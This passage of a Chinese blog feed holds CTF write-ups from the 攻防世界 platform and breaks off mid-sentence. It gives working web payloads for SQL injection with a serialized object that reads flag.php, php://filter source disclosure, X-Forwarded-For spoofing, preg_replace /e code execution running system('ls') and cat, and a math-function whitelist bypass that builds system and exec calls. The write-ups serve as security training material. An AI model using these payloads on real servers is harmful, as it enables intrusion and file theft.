class="line">http://111.200.241.244:63407//view.php?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;s&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;#</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到base64加密文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101047862.png" alt="image-20220310104731820"></p><p>这里进行base64解密得到</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;c1e552fdf77049fabf65168f22f7aeab&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也可以直接点击链接</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101047366.png" alt="image-20220310104743329"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界ics-05</title>
      <link href="/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cics-05/"/>
      <url>/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cics-05/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界ics-05-preg-replace-函数-x2F-e-漏洞"><a href="#攻防世界ics-05-preg-replace-函数-x2F-e-漏洞" class="headerlink" title="攻防世界ics-05(preg_replace()函数 &#x2F;e 漏洞)"></a>攻防世界ics-05(preg_replace()函数 &#x2F;e 漏洞)</h1><p>查阅资料发现这里是一个文件包含漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:60854/index.php?page=index.php</span><br></pre></td></tr></table></figure><p>使用php:&#x2F;&#x2F;filter协议用于读取源码, php:&#x2F;&#x2F;input用于执行php代码</p><p>再次使用php:&#x2F;&#x2F;filter&#x2F;read&#x3D; 参数读取文件</p><p>在使用转换过滤器php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;进行base64的编码</p><p>之后再次使用resource&#x3D;参数来过滤筛选过滤的数据流</p><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php进行读取</p><p>具体实例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:60854/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>得到源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">posix_setuid</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;renderer&quot;</span> content=<span class="string">&quot;webkit&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge,chrome=1&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;layui/css/layui.css&quot;</span> media=<span class="string">&quot;all&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;设备维护中心&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;ul <span class="class"><span class="keyword">class</span>=&quot;<span class="title">layui</span>-<span class="title">nav</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">layui</span>-<span class="title">nav</span>-<span class="title">item</span> <span class="title">layui</span>-<span class="title">this</span>&quot;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">page</span>=<span class="title">index</span>&quot;&gt;云平台设备维护中心&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">fieldset</span> <span class="title">class</span>=&quot;<span class="title">layui</span>-<span class="title">elem</span>-<span class="title">field</span> <span class="title">layui</span>-<span class="title">field</span>-<span class="title">title</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>: 30<span class="title">px</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">legend</span>&gt;设备列表&lt;/<span class="title">legend</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">fieldset</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">table</span> <span class="title">class</span>=&quot;<span class="title">layui</span>-<span class="title">hide</span>&quot; <span class="title">id</span>=&quot;<span class="title">test</span>&quot;&gt;&lt;/<span class="title">table</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">script</span> <span class="title">type</span>=&quot;<span class="title">text</span>/<span class="title">html</span>&quot; <span class="title">id</span>=&quot;<span class="title">switchTpl</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;!-- 这里的 <span class="title">checked</span> 的状态只是演示 --&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">checkbox</span>&quot; <span class="title">name</span>=&quot;<span class="title">sex</span>&quot; <span class="title">value</span>=&quot;</span>&#123;&#123;d.id&#125;&#125;<span class="string">&quot; lay-skin=&quot;</span><span class="keyword">switch</span><span class="string">&quot; lay-text=&quot;</span>开|关<span class="string">&quot; lay-filter=&quot;</span>checkDemo<span class="string">&quot; &#123;&#123; d.id==1 0003 ? &#x27;checked&#x27; : &#x27;&#x27; &#125;&#125;&gt;</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script src=&quot;</span>layui/layui.js<span class="string">&quot; charset=&quot;</span>utf-<span class="number">8</span><span class="string">&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">    layui.use(&#x27;table&#x27;, function() &#123;</span></span><br><span class="line"><span class="string">        var table = layui.table,</span></span><br><span class="line"><span class="string">            form = layui.form;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        table.render(&#123;</span></span><br><span class="line"><span class="string">            elem: &#x27;#test&#x27;,</span></span><br><span class="line"><span class="string">            url: &#x27;/somrthing.json&#x27;,</span></span><br><span class="line"><span class="string">            cellMinWidth: 80,</span></span><br><span class="line"><span class="string">            cols: [</span></span><br><span class="line"><span class="string">                [</span></span><br><span class="line"><span class="string">                    &#123; type: &#x27;numbers&#x27; &#125;,</span></span><br><span class="line"><span class="string">                     &#123; type: &#x27;checkbox&#x27; &#125;,</span></span><br><span class="line"><span class="string">                     &#123; field: &#x27;id&#x27;, title: &#x27;ID&#x27;, width: 100, unresize: true, sort: true &#125;,</span></span><br><span class="line"><span class="string">                     &#123; field: &#x27;name&#x27;, title: &#x27;设备名&#x27;, templet: &#x27;#nameTpl&#x27; &#125;,</span></span><br><span class="line"><span class="string">                     &#123; field: &#x27;area&#x27;, title: &#x27;区域&#x27; &#125;,</span></span><br><span class="line"><span class="string">                     &#123; field: &#x27;status&#x27;, title: &#x27;维护状态&#x27;, minWidth: 120, sort: true &#125;,</span></span><br><span class="line"><span class="string">                     &#123; field: &#x27;check&#x27;, title: &#x27;设备开关&#x27;, width: 85, templet: &#x27;#switchTpl&#x27;, unresize: true &#125;</span></span><br><span class="line"><span class="string">                ]</span></span><br><span class="line"><span class="string">            ],</span></span><br><span class="line"><span class="string">            page: true</span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">    layui.use(&#x27;element&#x27;, function() &#123;</span></span><br><span class="line"><span class="string">        var element = layui.element; //导航的hover效果、二级菜单等功能，需要依赖element模块</span></span><br><span class="line"><span class="string">        //监听导航点击</span></span><br><span class="line"><span class="string">        element.on(&#x27;nav(demo)&#x27;, function(elem) &#123;</span></span><br><span class="line"><span class="string">            //console.log(elem)</span></span><br><span class="line"><span class="string">            layer.msg(elem.text());</span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">$page</span> = <span class="subst">$_GET</span>[page];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if (isset(<span class="subst">$page</span>)) &#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if (ctype_alnum(<span class="subst">$page</span>)) &#123;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">    &lt;div style=&quot;</span>text-align:center<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;p class=&quot;</span>lead<span class="string">&quot;&gt;&lt;?php echo <span class="subst">$page</span>; die();?&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;else&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">        &lt;div style=&quot;</span>text-align:center<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;p class=&quot;</span>lead<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if (strpos(<span class="subst">$page</span>, &#x27;input&#x27;) &gt; 0) &#123;</span></span><br><span class="line"><span class="string">                    die();</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if (strpos(<span class="subst">$page</span>, &#x27;ta:text&#x27;) &gt; 0) &#123;</span></span><br><span class="line"><span class="string">                    die();</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if (strpos(<span class="subst">$page</span>, &#x27;text&#x27;) &gt; 0) &#123;</span></span><br><span class="line"><span class="string">                    die();</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if (<span class="subst">$page</span> === &#x27;index.php&#x27;) &#123;</span></span><br><span class="line"><span class="string">                    die(&#x27;Ok&#x27;);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                    include(<span class="subst">$page</span>);</span></span><br><span class="line"><span class="string">                    die();</span></span><br><span class="line"><span class="string">                ?&gt;</span></span><br><span class="line"><span class="string">        &lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if (<span class="subst">$_SERVER</span>[&#x27;HTTP_X_FORWARDED_FOR&#x27;] === &#x27;127.0.0.1&#x27;) &#123;</span></span><br><span class="line"><span class="string">//这里验证X-Forwarded-For头是不是127.0.0.1</span></span><br><span class="line"><span class="string">    echo &quot;</span>&lt;br &gt;Welcome My Admin ! &lt;br &gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    <span class="subst">$pattern</span> = <span class="subst">$_GET</span>[pat];</span></span><br><span class="line"><span class="string">    <span class="subst">$replacement</span> = <span class="subst">$_GET</span>[rep];</span></span><br><span class="line"><span class="string">    <span class="subst">$subject</span> = <span class="subst">$_GET</span>[sub];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if (isset(<span class="subst">$pattern</span>) &amp;&amp; isset(<span class="subst">$replacement</span>) &amp;&amp; isset(<span class="subst">$subject</span>)) &#123;</span></span><br><span class="line"><span class="string">        preg_replace(<span class="subst">$pattern</span>, <span class="subst">$replacement</span>, <span class="subst">$subject</span>);</span></span><br><span class="line"><span class="string">    &#125;else&#123;</span></span><br><span class="line"><span class="string">        die();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>首先进行X-Forwarded-For:127.0.0.1参数伪造</p><p>之后由于preg_replace()函数的&#x2F;e漏洞进行代码执行</p><p>这段 PHP 代码会获取 3 个变量：pat、rep 和 sub 的值，然后进入一个 if-else 语句。<strong>isset() 函数</strong>在 PHP 中用来判断变量是否声明，此处如果这 3 个值都有传递就会执行 **preg_replace()**函数。<br> preg_replace 函数执行一个正则表达式的搜索和替换，语法如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Copy <span class="keyword">mixed</span> <span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> <span class="variable">$pattern</span> , <span class="keyword">mixed</span> <span class="variable">$replacement</span> , <span class="keyword">mixed</span> <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] )</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>$pattern</td><td>要搜索的模式，可以是字符串或一个字符串数组</td></tr><tr><td>$replacement</td><td>用于替换的字符串或字符串数组</td></tr><tr><td>$subject: 要搜索替换的目标字符串或字符串数组</td><td></td></tr><tr><td>$limit</td><td>可选，对于每个模式用于每个 subject 字符串的最大可替换次数。默认是 -1（无限制）</td></tr><tr><td>$count</td><td>可选，为替换执行的次数</td></tr><tr><td>如果 subject 是一个数组， preg_replace() 返回一个数组，其他情况下返回一个字符串。如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。</td><td></td></tr><tr><td>这个函数有个 “&#x2F;e” 漏洞，“&#x2F;e” 修正符使 preg_replace() 将 replacement 参数当作 PHP  代码进行执行。如果这么做要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含  preg_replace() 的行中出现语法解析错误。</td><td></td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?pat=/abc/e&amp;rep=system(&#x27;ls&#x27;)&amp;sub=abc</span><br></pre></td></tr></table></figure><p>获得css index.html index.php js layui logo.png s3chahahaDir start.sh 视图.png</p><p>查看一下s3chahahaDir这个目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?pat=/abc/e&amp;rep=system(&#x27;ls%20s3chahahaDir&#x27;)&amp;sub=abc</span><br></pre></td></tr></table></figure><p> 执行成功，发现 s3chahahaDir 下有个 flag 文件夹，那就更可疑了，再次执行 ls 命令在该文件中查看内容 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?pat=/abc/e&amp;rep=system(&#x27;ls%20s3chahahaDir/flag&#x27;)&amp;sub=abc</span><br></pre></td></tr></table></figure><p> 执行成功，发现 flag 文件夹下有一个 flag.php 文件，使用 cat 命令查看文件。查看之后打开 F12，即可看到 flag </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?pat=/abc/e&amp;rep=system(&#x27;cat%20s3chahahaDir/flag/flag.php&#x27;)&amp;sub=abc </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界love_math</title>
      <link href="/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Clove_math/"/>
      <url>/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Clove_math/</url>
      
        <content type="html"><![CDATA[<h1 id="love-math攻防世界"><a href="#love-math攻防世界" class="headerlink" title="love_math攻防世界"></a>love_math攻防世界</h1><p>扫目录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141115076.png" alt="image-20220314111502981"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141115588.png" alt="image-20220314111534555"></p><p>这题真简单..</p><p>打开网页得到源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;<span class="comment">#如果没有设置c参数就显示源码</span></span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];<span class="comment">#将得到的c赋给</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;<span class="comment">#要是长度大于80就输出</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];<span class="comment">#黑名单</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;<span class="comment">#m表示多行匹配</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);<span class="comment">#匹配完的结果放到funcs数组里面,这里的preg_match_all将匹配到的元素放在一层数组里面</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;<span class="comment">#如果不在数组里</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);<span class="comment">#eval输出c</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个匹配规则能过的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abs(1)匹配出abs能过</span><br><span class="line">1abs()匹配出abs能过</span><br><span class="line">absa()匹配出absa不能过</span><br><span class="line">abs(a)匹配出abs和a,a不在不能过</span><br><span class="line">abs()a匹配出abs和a,a不在不能过</span><br></pre></td></tr></table></figure><p><strong>思路一</strong></p><p>拼接裁剪的方式,首先不能加入其他的字符,只能使用上面的字符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:$pi=hypot.min.fmod;$pi=$pi&#123;2&#125;.$pi&#123;0&#125;.$pi&#123;2&#125;.$pi&#123;6&#125;.$pi&#123;7&#125;.$pi&#123;8&#125;.$pi&#123;3&#125;;$pi()</span><br></pre></td></tr></table></figure><p>这段payload分为三部分,</p><ul><li>首先定义一个变量名$pi,因为pi在白名单中最短,其值为phpot.min.fmod,因为hypot min fmod均在白名单中,而且phpinfo中的所有字符均可以在其中找到</li><li>然后从hypot.min.fmod中分别取第2 0 2 6 7 8 3位置的字符,拼接成phpinfo字符串,并重新赋值给$pi变量</li><li>最后执行$pi(),即执行phpinfo()函数.</li></ul><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141136070.png" alt="image-20220314113632005"></p><p>但是根据这个思路去getflag,怎么也会超过长度</p><p>而其中的关键是base_convert()函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base_convert() 函数在任意进制之间转换数字。</span><br><span class="line">语法</span><br><span class="line">base_convert(number,frombase,tobase);</span><br><span class="line"></span><br><span class="line">参数 描述</span><br><span class="line">number 必需。规定要转换的数。</span><br><span class="line">frombase 必需。规定数字原来的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。</span><br><span class="line">tobase 必需。规定要转换的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。</span><br><span class="line">技术细节</span><br><span class="line">返回值： number 转换为指定进制。</span><br><span class="line">返回类型： String</span><br><span class="line">PHP 版本： 4+</span><br></pre></td></tr></table></figure><p>这里可以使用16进制,还可以使用36进制,可以带上所有小写字母</p><p>36进制,是数据的一种表示方式,同我们日常生活中的表示方法不一样,它由0-9,a-z组成,字母不区分大小写,与十进制对应的关系是0-9对应0-9,a-z对应10-35</p><p>那么接下来我们就可以进行转换了,既然字母会有过滤我们就可以将字母转换成十进制的数字,在使用baseconvert(10,36)转换回来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo base_convert(&#x27;phpinfo&#x27;,36,10);</span><br><span class="line">#55490343972</span><br><span class="line">&lt;?php</span><br><span class="line">echo base_convert(55490343972,10,36);</span><br><span class="line">#phpinfo</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:base_convert(55490343972,10,36)()</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141153540.png" alt="image-20220314115340498"></p><p>接着我们使用system(‘ls’),这里因为不能转换()和’’只能转换字母</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo base_convert(&#x27;system&#x27;,36,10);</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo base_convert(&#x27;ls&#x27;,36,10);</span><br><span class="line">#1751504350</span><br><span class="line">#784</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:base_convert(1751504350,10,36)(base_convert(784,10,36))</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141158033.png" alt="image-20220314115838995"></p><p>接下来就是读取flag了,如果直接使用读取文件的函数file_get_contents中包含下划线,不在我们36进制之中,并且base_convert()的第一个参数太长会溢出,也就是10进制数没法无限大</p><p><strong>思路二</strong></p><p>借助getallheader()来控制请求头,通过请求头字段读取flag.php.这里也就类似于get,post之类的,但是只能控制小写字符,所以大写的直接被pass掉.getallheader()返回的是数组,要从数组里面取数据用array[‘xxx’].但是[]被waf了,因为{}中是可以带数字的,这里用getallheader(){1}可以分会自定义头1里面的内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:c=$pi=base_convert,$pi(696468,10,36)(($pi(8768397090111664438,10,30))()&#123;1&#125;)</span><br><span class="line">#exec(getallheaders()&#123;1&#125;)</span><br></pre></td></tr></table></figure><p><strong>exec()</strong> 执行   <code>command</code> 参数所指定的命令。  </p><p>base_convert(696468,10,36); 代表把696468从10进制转换为36进制，结果为exec。</p><p>base_convert(8768397090111664438,10,30);  